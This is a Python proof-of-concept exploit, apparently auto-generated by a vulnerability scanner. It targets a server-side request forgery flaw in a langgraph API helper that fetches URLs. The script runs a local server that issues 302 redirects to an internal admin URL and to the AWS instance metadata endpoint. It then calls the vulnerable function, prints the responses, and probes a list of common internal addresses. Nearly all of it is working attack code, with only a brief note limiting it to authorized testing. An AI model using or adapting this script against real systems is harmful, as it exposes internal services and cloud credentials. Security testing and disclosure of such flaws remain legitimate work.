#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: ssrf-013
# Sink: _make_http_request_with_retries
# Auto-generated — run with: python3 ssrf_url_makes_http_request__make_http_request_with_retries.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept: SSRF via _make_http_request_with_retries in langgraph_api_src

This script demonstrates that the _make_http_request_with_retries function
accepts a user-controlled URL and makes HTTP requests without any validation,
allowing SSRF to internal services or cloud metadata endpoints.

The exploit works by:
1. Setting up a local HTTP server that returns a redirect to an internal IP
2. Calling the vulnerable function with the attacker's server URL
3. The function follows the redirect and makes a request to the internal target

WARNING: This PoC is for educational/authorized testing only.
"""

import asyncio
import sys
import json
import socket
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

# Add the project source to path so we can import the vulnerable function
sys.path.insert(0, "/tmp/lg-api-dl/langgraph_api_src")

from langgraph_api.utils.retriable_client import _make_http_request_with_retries


# Configuration - change these for your testing
ATTACKER_HOST = "127.0.0.1"  # Our local server
ATTACKER_PORT = 9999
INTERNAL_TARGET = "http://127.0.0.1:8080/admin"  # Target internal service
REDIRECT_TARGET = "http://169.254.169.254/latest/meta-data/"  # AWS metadata endpoint


class RedirectHandler(BaseHTTPRequestHandler):
    """HTTP handler that returns a redirect to an internal IP."""
    
    def do_GET(self):
        """Handle GET requests by redirecting to internal target."""
        # Choose redirect target based on path
        if self.path == "/metadata":
            redirect_url = REDIRECT_TARGET
        else:
            redirect_url = INTERNAL_TARGET
            
        print(f"[*] Received request: {self.path}")
        print(f"[*] Redirecting to: {redirect_url}")
        
        self.send_response(302)
        self.send_header("Location", redirect_url)
        self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default logging."""
        pass


def start_redirect_server():
    """Start a local HTTP server that returns redirects."""
    server = HTTPServer((ATTACKER_HOST, ATTACKER_PORT), RedirectHandler)
    print(f"[*] Starting redirect server on {ATTACKER_HOST}:{ATTACKER_PORT}")
    print(f"[*] Will redirect to internal targets: {INTERNAL_TARGET}")
    print(f"[*] Will redirect to metadata endpoint: {REDIRECT_TARGET}")
    
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


async def exploit_ssrf(target_url: str, method: str = "GET"):
    """
    Attempt SSRF by calling the vulnerable function with a redirect URL.
    
    Args:
        target_url: The URL to request (should point to our redirect server)
        method: HTTP method to use
    
    Returns:
        The response if successful, None otherwise
    """
    print(f"\n[*] Attempting SSRF to: {target_url}")
    print(f"[*] Method: {method}")
    
    try:
        # Call the vulnerable function - it will follow redirects to internal IPs
        response = await _make_http_request_with_retries(
            url=target_url,
            headers={"User-Agent": "SSRF-PoC"},
            method=method,
            json_data=None,
            max_retries=1,
            base_delay=0.1
        )
        
        print(f"[+] SUCCESS! Got response from internal service:")
        print(f"    Status: {response.status_code}")
        print(f"    Headers: {dict(response.headers)}")
        print(f"    Body (first 500 chars): {response.text[:500]}")
        return response
        
    except Exception as e:
        print(f"[-] Request failed: {type(e).__name__}: {e}")
        return None


async def main():
    """Main PoC execution."""
    print("=" * 60)
    print("SSRF PoC for _make_http_request_with_retries")
    print("=" * 60)
    
    # Start our redirect server
    redirect_server = start_redirect_server()
    
    try:
        # Test 1: Basic SSRF to internal service
        print("\n" + "=" * 40)
        print("Test 1: SSRF to internal HTTP service")
        print("=" * 40)
        
        attacker_url = f"http://{ATTACKER_HOST}:{ATTACKER_PORT}/test"
        await exploit_ssrf(attacker_url)
        
        # Test 2: SSRF to cloud metadata endpoint (AWS)
        print("\n" + "=" * 40)
        print("Test 2: SSRF to AWS metadata endpoint")
        print("=" * 40)
        
        metadata_url = f"http://{ATTACKER_HOST}:{ATTACKER_PORT}/metadata"
        await exploit_ssrf(metadata_url)
        
        # Test 3: Direct SSRF to internal IP (if accessible)
        print("\n" + "=" * 40)
        print("Test 3: Direct SSRF to internal IP")
        print("=" * 40)
        
        # Try common internal services
        internal_targets = [
            "http://127.0.0.1:8080/",
            "http://127.0.0.1:3000/",
            "http://localhost:5000/",
            "http://169.254.169.254/latest/meta-data/",
        ]
        
        for target in internal_targets:
            print(f"\n[*] Trying direct SSRF to: {target}")
            await exploit_ssrf(target)
            
    finally:
        # Cleanup
        redirect_server.shutdown()
        print("\n[*] Redirect server stopped.")


if __name__ == "__main__":
    asyncio.run(main())
